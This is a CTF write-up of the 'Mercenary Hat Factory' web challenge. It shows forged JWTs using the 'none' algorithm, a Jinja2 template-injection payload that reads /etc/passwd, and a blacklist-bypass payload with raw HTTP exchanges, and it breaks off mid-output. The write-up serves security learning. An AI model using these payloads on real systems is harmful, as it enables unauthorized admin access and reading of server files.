# X-MAS CTF 2019 – Mercenary Hat Factory

* **Category:** web
* **Points:** 424 

## Challenge

> "Mmph Mmmmph Mmph Mmmph!"
> Translation: Come and visit our hat factory!
> 
> Files: [server.py](server.py)
>
> Remote server: http://challs.xmas.htsp.ro:11005
>
> Author: Milkdrop

## Solution

Registering a user and analyzing cookies you will find a cookie called `auth` containing a JWT.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJtM3NzYXAwIn0.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY

{"typ":"JWT","alg":"HS256"}.{"type":"user","user":"m3ssap0"}.6MIKOYbtUodqSJUZyT4iGRMLPcrRzbniLjJU8nhNhKY
```

You can check its creation inside `register` and `login` methods of the source code [server.py](server.py).

Analyzing the source code you can discover two interesting endpoints:
* `/makehat` for which you have to be an authorized admin;
* `/authorize` that can let you to become an authorized admin, but there are some restrictions.

Considering the presence of template rendering operations into `/makehat` endpoint with a parameter read from the user, i.e. `hatName`, probably that functionality is vulnerable to *Server Side Template Injection* (*SSTI*) due to the insecure usage of *Flask/Jinja2* template engine.

The first check to bypass for the `/authorize` endpoint is the following.

```python
            if (userData["type"] != "admin"):
                return render_template ("error.html", error = "Unauthorized.")
```

This can be easily bypassed forging a JWT like the following and testing that you are an admin connecting to the root of the website.

```
{"typ":"JWT","alg":"none"}.{"type":"admin","user":"m3ssap0"}.

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
```

Checking it to the index endpoint.

```
GET / HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoibTNzc2FwMCJ9.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 17 Dec 2019 14:11:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 736
Connection: close

<head>
	<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
</head>

<body>
	<div class="navbar">
<a style="float: left" href="/">Home</a>

	<a href="/logout">Logout</a>

</div>
	<div class="container">
		
			<h1>Welcome <span style="color: #A1FF44">m3ssap0</span>!</h1>
			
				
					<div>You are a Level 1 factory administrator. Here is your factory jam:<br><br>
					<iframe width="879" height="468" src="https://www.youtube.com/embed/aj1yZ19WuM0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
				
				</div>
				<img class="companion" src="/static/img/balloonicorn.png">
			
		
	</div>
	<script src="/static/js/snow.js"></script>
</body>
```

At this point you have to break this check.

```python
                if (request.form.get ('accessCode') == str (uid) + usr + pss + userpss):
                    authorizedAdmin [userData ["user"]] = True
```

Analyzing the code you will understand that variables are populated from Santa's data, that data is well known except its secret.

```python
adminPrivileges = [[None]*3]*500

adminPrivileges [0][0] = 0 # UID
adminPrivileges [0][1] = "Santa" #Uname
adminPrivileges [0][2] = SantaSecret
```

* `str(uid)` is `0`;
* `usr` is `Santa`;
* `pss` is the unknown `SantaSecret`;
* `userpss` can be set following the `step=1` procedure of the `/authorize` endpoint, so it can be forced.

At this point I was stuck and I was not able to bypass this check, so I did something (stupid, lol) that led me to what I think was an **unintended solution** to bypass the check: I registered a user with username `Santa`.

The user with username `Santa` was already into `adminPrivileges`, so I only crafted the correct JWT to bypass the previous check and I added the `pass` field needed by the `/makehat` endpoint.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJTYW50YSJ9.zTPHtZUj9Avd1XXpM6T0nnLl7x9QeuSqaqB5ClMH8gk

{"typ":"JWT","alg":"HS256"}.{"type":"user","user":"Santa"}.zTPHtZUj9Avd1XXpM6T0nnLl7x9QeuSqaqB5ClMH8gk

{"typ":"JWT","alg":"none"}.{"type":"admin","user":"Santa","pass":"password"}.

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
```

Here the request to the endpoint.

```
GET /makehat?hatName=test HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:03:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 459
Connection: close

<head>
	<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
</head>

<body>
	<div class="navbar">
<a style="float: left" href="/">Home</a>

	<a href="/login">Login</a>
	<a href="/register">Register</a>

</div>
	<div class="container" style="text-align:center">
		<img class="hat" src="/static/img/hats/7.png">
		<h1>You are viewing:<br><span style="color:#FFA144;">test</span></h1>
	</div>
</body>

<script src="/static/js/snow.js"></script>
```

Trying the auth token to the homepage will confirm our privileges.

```
GET / HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:06:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 971
Connection: close

<head>
	<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
</head>

<body>
	<div class="navbar">
<a style="float: left" href="/">Home</a>

	<a href="/logout">Logout</a>

</div>
	<div class="container">
		
			<h1>Welcome <span style="color: #A1FF44">Santa</span>!</h1>
			
				
					<div>You are a Level 2 factory administrator. You may now test and create new hats. You can now oversee the factory workers:<br><br>
					<iframe width="879" height="468" src="https://www.youtube.com/embed/QDCPKBF7a1Q" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
					<br><br>
					<form action="/makehat" method="get">
						<input placeholder="Hat Name" type="text" name="hatName"><br>
					<input type="submit" value="Make Hat!">
					</form> 
				
				</div>
				<img class="companion" src="/static/img/balloonicorn.png">
			
		
	</div>
	<script src="/static/js/snow.js"></script>
</body>
```

Trying the `{{7*7}}` payload to the `/makehat` endpoint will reveal a SSTI vulnerability.

```
GET /makehat?hatName=%7B%7B7%2A7%7D%7D HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:11:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 457
Connection: close

<head>
	<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
</head>

<body>
	<div class="navbar">
<a style="float: left" href="/">Home</a>

	<a href="/login">Login</a>
	<a href="/register">Register</a>

</div>
	<div class="container" style="text-align:center">
		<img class="hat" src="/static/img/hats/3.png">
		<h1>You are viewing:<br><span style="color:#FFA144;">49</span></h1>
	</div>
</body>

<script src="/static/js/snow.js"></script>
```

Usually, something like the following can be used to access classes loaded into the server and to invoke them.

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

But we have some restrictions, as you can see in the following blacklist used into `/makehat` endpoint.

```python
blacklist = ["config", "self", "request", "[", "]", '"', "_", "+", " ", "join", "%", "%25"]
```

So we have to use some tricks like the hexadecimal encoding of the strings and the `attr` filter of Jinja2.

The following request can be used to enumerate all classes.

```
GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()}} HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:30:39 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Accept-Encoding
Content-Length: 36060

<head>
	<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
</head>

<body>
	<div class="navbar">
<a style="float: left" href="/">Home</a>

	<a href="/login">Login</a>
	<a href="/register">Register</a>

</div>
	<div class="container" style="text-align:center">
		<img class="hat" src="/static/img/hats/7.png">
		<h1>You are viewing:<br><span style="color:#FFA144;">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;re.Pattern&#39;&gt;, &lt;class &#39;re.Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;unpack_iterator&#39;&gt;, &lt;class &#39;zipfile.ZipInfo&#39;&gt;, &lt;class &#39;zipfile.LZMACompressor&#39;&gt;, &lt;class &#39;zipfile.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile._SharedFile&#39;&gt;, &lt;class &#39;zipfile._Tellable&#39;&gt;, &lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;pyexpat.xmlparser&#39;&gt;, &lt;class &#39;plistlib.Data&#39;&gt;, &lt;class &#39;plistlib._PlistParser&#39;&gt;, &lt;class &#39;plistlib._DumbXMLWriter&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistParser&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistWriter&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;pkg_resources.extern.VendorImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.appdirs.AppDirs&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.Infinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.NegativeInfinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.version._BaseVersion&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.specifiers.BaseSpecifier&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._Constants&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._ParseResultsWithOffset&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParseResults&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._FifoCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._NullToken&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.OnlyOnce&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.pyparsing_common&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Node&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Marker&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.requirements.Requirement&#39;&gt;, &lt;class &#39;pkg_resources.IMetadataProvider&#39;&gt;, &lt;class &#39;pkg_resources.WorkingSet&#39;&gt;, &lt;class &#39;pkg_resources.Environment&#39;&gt;, &lt;class &#39;pkg_resources.ResourceManager&#39;&gt;, &lt;class &#39;pkg_resources.NullProvider&#39;&gt;, &lt;class &#39;pkg_resources.NoDists&#39;&gt;, &lt;class &#39;pkg_resources.EntryPoint&#39;&gt;, &lt;class &#39;pkg_resources.Distribution&#39;&gt;, &lt;class &#39;gunicorn.six._LazyDescr&#39;&gt;, &lt;class &#39;gunicorn.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;gunicorn.pidfile.Pidfile&#39;&gt;, &lt;class &#39;gunicorn.sock.BaseSocket&#39;&gt;, &lt;class &#39;gunicorn.arbiter.Arbiter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;shlex.shlex&#39;&gt;, &lt;class &#39;gunicorn.reloader.InotifyReloader&#39;&gt;, &lt;class &#39;gunicorn.config.Config&#39;&gt;, &lt;class &#39;gunicorn.config.Setting&#39;&gt;, &lt;class &#39;gunicorn.debug.Spew&#39;&gt;, &lt;class &#39;gunicorn.app.base.BaseApplication&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;_queue.SimpleQueue&#39;&gt;, &lt;class &#39;queue.Queue&#39;&gt;, &lt;class &#39;queue._PySimpleQueue&#39;&gt;, &lt;class &#39;logging.handlers.QueueListener&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class 